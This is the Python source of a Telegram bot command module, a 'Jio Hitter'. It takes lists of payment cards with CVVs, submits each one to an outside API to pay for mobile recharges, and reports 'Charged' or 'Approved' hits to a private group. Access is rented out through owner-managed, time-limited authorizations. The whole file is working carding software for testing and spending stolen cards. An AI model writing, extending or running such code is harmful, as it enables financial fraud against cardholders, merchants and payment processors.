

import re
import asyncio
import aiohttp
import json
import os
import time
from typing import List, Optional, Tuple, Dict
from datetime import datetime, timedelta
from telegram import Update, LinkPreviewOptions, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes, CommandHandler

from utils.rate_limit import rate_limit
from utils.lock_check import check_lock
from utils.decorators import owner_only, log_command
from logger import get_logger
from ui.emojis import PremiumEmoji as E
from ui.emojis import ButtonEmoji as BE
from config import OWNER_USERNAME, OWNER_NAME, OWNER_ID

logger = get_logger(__name__)





API_URL = "http://5.174.160.906/api/8961205934/jio/rc"
TIMEOUT = 120
MAX_CARDS = 5


HIT_DETECTION_GROUP_ID = -1003970590776


VALID_AMOUNTS = {
    11, 19, 29, 39, 49, 99, 149, 199, 249, 299, 349, 399, 449, 499,
    599, 699, 719, 799, 899, 999, 1199, 1499, 1999, 2399, 2599, 2999, 3599
}


JIO_USERS_FILE = "jio_users.json"





def load_jio_users() -> Dict[int, float]:
    """Load authorized users with expiry timestamps."""
    if not os.path.exists(JIO_USERS_FILE):
        return {}
    try:
        with open(JIO_USERS_FILE, 'r') as f:
            data = json.load(f)
            users = data.get("users", {})
            return {int(k): float(v) for k, v in users.items()}
    except Exception as e:
        logger.error(f"Failed to load jio users: {e}")
        return {}

def save_jio_users(users: Dict[int, float]) -> bool:
    try:
        with open(JIO_USERS_FILE, 'w') as f:
            json.dump({"users": users}, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Failed to save jio users: {e}")
        return False

def is_jio_authorized(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    users = load_jio_users()
    expiry = users.get(user_id)
    if expiry is None:
        return False
    if time.time() > expiry:
        users.pop(user_id, None)
        save_jio_users(users)
        return False
    return True

def get_jio_expiry(user_id: int) -> Optional[datetime]:
    if user_id == OWNER_ID:
        return None
    users = load_jio_users()
    expiry_ts = users.get(user_id)
    if expiry_ts is None:
        return None
    return datetime.fromtimestamp(expiry_ts)





CARD_PATTERN = re.compile(
    r'(\d{13,19})\s*[|/:]\s*(\d{1,2})\s*[|/:]\s*(\d{2,4})\s*[|/:]\s*(\d{3,4})'
)
CARD_PATTERN_SPACE = re.compile(
    r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
)

def extract_cards_from_text(text: str) -> List[str]:
    if not text:
        return []
    cards = []
    for match in CARD_PATTERN.finditer(text):
        card_number, month, year, cvv = match.groups()
        month = month.zfill(2)
        if len(year) == 4:
            year = year[2:]
        cards.append(f"{card_number}|{month}|{year}|{cvv}")
        if len(cards) >= MAX_CARDS:
            break
    if not cards:
        for match in CARD_PATTERN_SPACE.finditer(text):
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            cards.append(f"{card_number}|{month}|{year}|{cvv}")
            if len(cards) >= MAX_CARDS:
                break
    return cards[:MAX_CARDS]

def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            card_number, month, year, cvv = match.groups()
            month = month.zfill(2)
            if len(year) == 4:
                year = year[2:]
            return card_number, month, year, cvv
    return None

def is_valid_amount(amount_str: str) -> bool:
    try:
        amt = int(amount_str)
        return amt in VALID_AMOUNTS
    except ValueError:
        return False





async def hit_jio(number: str, amount: str, card: str) -> dict:
    url = f"{API_URL}?jio={number}&amount={amount}&cc={card}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=TIMEOUT) as resp:
                if resp.status != 200:
                    return {"error": f"HTTP {resp.status}", "status": "error"}
                try:
                    data = await resp.json()
                except json.JSONDecodeError:
                    raw_text = await resp.text()
                    return {"error": f"Invalid JSON: {raw_text[:200]}", "status": "error"}
                return data
    except asyncio.TimeoutError:
        return {"error": "Timeout (API took too long)", "status": "error"}
    except Exception as e:
        return {"error": str(e)[:50], "status": "error"}





def format_hit_message(result: dict, user_id: int, first_name: str, username: str) -> str:
    """
    Format hit detection message:
    🔥 HIT DETECTED
    ━━━━━━━━━━━━━━━━━━
    ⚡ Gateway: JIO (payglocal)
    💲 Amount: ₹19.6
    💎 Status: Charged 💎
    ⚡ Response: Your payment was successful
    ━━━━━━━━━━━━━━━━━━
    👤 User: ITZ W ! !
    """
    status = result.get("status", "unknown").lower()
    if status in ("charged", "success"):
        status_emoji = "💎"
        status_text = "Charged"
    elif status == "approved":
        status_emoji = "✅"
        status_text = "Approved"
    else:
        status_emoji = "❌"
        status_text = status.capitalize() if status else "Unknown"

    amount = result.get("amount", "N/A")
    gate_raw = result.get("gate", "N/A")

    if gate_raw and gate_raw != "N/A":
        gate_display = f"JIO ({gate_raw})"
    else:
        gate_display = "JIO"
    resp_msg = result.get("response", "No response")


    text = f"""
🔥 <b>HIT DETECTED</b>
━━━━━━━━━━━━━━━━━━
<b>{E.GATE} Gateway:</b> {gate_display}
<b>💲 Amount:</b> {amount}
<b>{status_emoji} Status:</b> {status_text} {status_emoji}
<b>{E.RESPONSE} Response:</b> <code>{resp_msg}</code>
━━━━━━━━━━━━━━━━━━
<b>{E.USER} User:</b> <a href='tg://user?id={user_id}'>{first_name}</a>"""
    return text

async def send_hit_detection(context: ContextTypes.DEFAULT_TYPE, user_id: int, first_name: str, username: str, result: dict):
    status = result.get("status", "").lower()
    if status not in ("approved", "charged", "success"):
        return
    try:
        text = format_hit_message(result, user_id, first_name, username)
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("MA̸𝑹K", url="https://t.me/OggyPrimeBot", style="primary", icon_custom_emoji_id=BE.HIIT)]
        ])
        await context.bot.send_message(
            HIT_DETECTION_GROUP_ID,
            text,
            parse_mode="HTML",
            reply_markup=keyboard,
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        logger.info(f"Hit detection sent for user {user_id}: {status} - {result.get('amount')}")
    except Exception as e:
        logger.error(f"Failed to send hit detection: {e}")





def format_result(card: str, response: dict, index: int, total: int) -> str:
    status = response.get("status", "unknown").lower()
    if status == "charged" or status == "success":
        emoji = E.get_charge_emoji()
        status_text = "Charged"
    elif status == "approved":
        emoji = E.APPROVED
        status_text = "Approved"
    elif status == "declined":
        emoji = E.DECLINED
        status_text = "Declined"
    elif status == "error":
        emoji = E.ERROR
        status_text = "Error"
    else:
        emoji = E.INFO
        status_text = status.capitalize() if status else "Unknown"

    amount = response.get("amount", "N/A") or "N/A"
    gate = response.get("gate", "N/A") or "N/A"
    resp_msg = response.get("response", response.get("error", "No response"))

    return f"""
<blockquote><b>Card {index}/{total}</b></blockquote>
{E.CARD} <code>{card}</code>
{E.GATE} Gateway: {gate}
💲 Amount: {amount}
{E.RESPONSE} Response: <code>{resp_msg}</code>
<b>Status:</b> {status_text} {emoji}
"""





@check_lock
@rate_limit("gate")
async def handle_jhit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name
    username = user.username or ""

    if not is_jio_authorized(user_id):
        await update.message.reply_text(
            f"""
{E.ERROR} <b>Access Denied</b>
━━━━━━━━━━━━━━━━━━
You are not authorized to use the Jio Hitter.

Contact the owner to request access.
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    if not context.args:
        await update.message.reply_text(
            f"""
{E.INFO} <b>Jio Hitter Usage</b>
━━━━━━━━━━━━━━━━━━
<code>/jhit &lt;number&gt; &lt;amount&gt; &lt;card1&gt; [card2] ...</code>

<b>Supported amounts:</b>
{', '.join(str(a) for a in sorted(VALID_AMOUNTS))}

<b>Examples:</b>
<code>/jhit 9876543210 11 4111111111111111|12|26|123</code>
<code>/jhit 9876543210 49 card1 card2</code>

Max <b>{MAX_CARDS}</b> cards per command.
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    number = context.args[0].strip()
    if len(context.args) < 2:
        await update.message.reply_text(
            f"{E.ERROR} Missing amount. Usage: <code>/jhit number amount card(s)</code>",
            parse_mode="HTML"
        )
        return
    amount = context.args[1].strip()

    if not is_valid_amount(amount):
        await update.message.reply_text(
            f"""
{E.ERROR} <b>Invalid Amount</b>
━━━━━━━━━━━━━━━━━━
Amount <code>{amount}</code> is not supported.

<b>Supported amounts:</b>
{', '.join(str(a) for a in sorted(VALID_AMOUNTS))}
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
        return

    cards = []
    if len(context.args) > 2:
        raw = " ".join(context.args[2:])
        cards = extract_cards_from_text(raw)
    elif update.message.reply_to_message:
        reply_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
        cards = extract_cards_from_text(reply_text)

    if not cards:
        await update.message.reply_text(
            f"{E.ERROR} No valid cards found. Provide up to {MAX_CARDS} cards.",
            parse_mode="HTML"
        )
        return

    if len(cards) > MAX_CARDS:
        cards = cards[:MAX_CARDS]
        await update.message.reply_text(
            f"{E.WARNING} Only first {MAX_CARDS} cards will be processed.",
            parse_mode="HTML"
        )

    progress = await update.message.reply_text(
        f"""
{E.FLY} <b>Jio Hitting...</b>
📱 Number: <code>{number}</code>
💲 Amount: <code>{amount}</code>
{E.CARD} Cards: <code>{len(cards)}</code>
━━━━━━━━━━━━━━━━━━
<i>Starting... (API may take up to 120s)</i>
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>""",
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    async def background():
        output_parts = []
        for i, card in enumerate(cards, 1):
            resp = await hit_jio(number, amount, card)
            result_text = format_result(card, resp, i, len(cards))
            output_parts.append(result_text)

            status = resp.get("status", "").lower()
            if status in ("approved", "charged", "success"):
                await send_hit_detection(context, user_id, first_name, username, resp)

            current_output = f"""
{E.HIT} <b>Jio Hitter Results</b> ({i}/{len(cards)})
━━━━━━━━━━━━━━━━━━
📱 Number: <code>{number}</code>
💲 Amount: <code>{amount}</code>
━━━━━━━━━━━━━━━━━━
""" + "\n━━━━━━━━━━━━━━━━━━\n".join(output_parts) + f"""

━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"""

            try:
                await progress.edit_text(
                    current_output,
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
            except Exception as e:
                logger.warning(f"Progress update failed: {e}")

    asyncio.create_task(background())





@owner_only
@log_command
async def jauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorize a user for Jio hitter with expiry in days."""
    if len(context.args) != 2:
        await update.message.reply_text(
            f"{E.INFO} Usage: <code>/jauth &lt;user_id&gt; &lt;days&gt;</code>\n\n"
            f"Example: <code>/jauth 123456789 30</code> (30 days access)",
            parse_mode="HTML"
        )
        return

    try:
        target_id = int(context.args[0])
        days = int(context.args[1])
    except ValueError:
        await update.message.reply_text(f"{E.ERROR} Invalid user ID or days.", parse_mode="HTML")
        return

    if days <= 0:
        await update.message.reply_text(f"{E.ERROR} Days must be greater than 0.", parse_mode="HTML")
        return

    users = load_jio_users()
    expiry_ts = time.time() + (days * 86400)
    users[target_id] = expiry_ts
    if save_jio_users(users):
        expiry_str = datetime.fromtimestamp(expiry_ts).strftime('%d %b %Y %H:%M')
        await update.message.reply_text(
            f"{E.SUCCESS} User <code>{target_id}</code> authorized for Jio hitter.\n"
            f"Expires: <code>{expiry_str}</code>",
            parse_mode="HTML"
        )
        try:
            await update.message.bot.send_message(
                target_id,
                f"{E.APPROVED} You have been authorized to use <code>/jhit</code>\n"
                f"Access expires on: <code>{expiry_str}</code>",
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to notify user {target_id}: {e}")
    else:
        await update.message.reply_text(f"{E.ERROR} Failed to save. Check logs.", parse_mode="HTML")

@owner_only
@log_command
async def junauth_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove Jio hitter authorization for a user."""
    if len(context.args) != 1:
        await update.message.reply_text(
            f"{E.INFO} Usage: <code>/junauth &lt;user_id&gt;</code>",
            parse_mode="HTML"
        )
        return

    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text(f"{E.ERROR} Invalid user ID.", parse_mode="HTML")
        return

    if target_id == OWNER_ID:
        await update.message.reply_text(f"{E.WARNING} Cannot remove the owner.", parse_mode="HTML")
        return

    users = load_jio_users()
    if target_id not in users:
        await update.message.reply_text(f"{E.WARNING} User <code>{target_id}</code> is not authorized.", parse_mode="HTML")
        return

    del users[target_id]
    if save_jio_users(users):
        await update.message.reply_text(f"{E.SUCCESS} User <code>{target_id}</code> removed from Jio access list.", parse_mode="HTML")
        try:
            await update.message.bot.send_message(
                target_id,
                f"{E.WARNING} Your Jio hitter access has been revoked by the owner."
            )
        except Exception as e:
            logger.error(f"Failed to notify user {target_id}: {e}")
    else:
        await update.message.reply_text(f"{E.ERROR} Failed to save. Check logs.", parse_mode="HTML")

@owner_only
@log_command
async def jiolist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all authorized users with expiry."""
    users = load_jio_users()
    if not users:
        await update.message.reply_text(f"{E.INFO} No users are authorized for Jio hitter.", parse_mode="HTML")
        return

    lines = []
    now = time.time()
    for uid, expiry_ts in sorted(users.items()):
        expiry_dt = datetime.fromtimestamp(expiry_ts)
        status = "🟢 Active" if expiry_ts > now else "🔴 Expired"
        lines.append(f"• <code>{uid}</code> – {status} (expires: {expiry_dt.strftime('%d %b %Y %H:%M')})")

    text = f"""
{E.USER} <b>Jio Hitter Authorized Users</b>
━━━━━━━━━━━━━━━━━━
Total: <code>{len(users)}</code>

{chr(10).join(lines)}
━━━━━━━━━━━━━━━━━━
{E.DEV} <b>Dev</b> ➠ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"""
    await update.message.reply_text(text, parse_mode="HTML", link_preview_options=LinkPreviewOptions(is_disabled=True))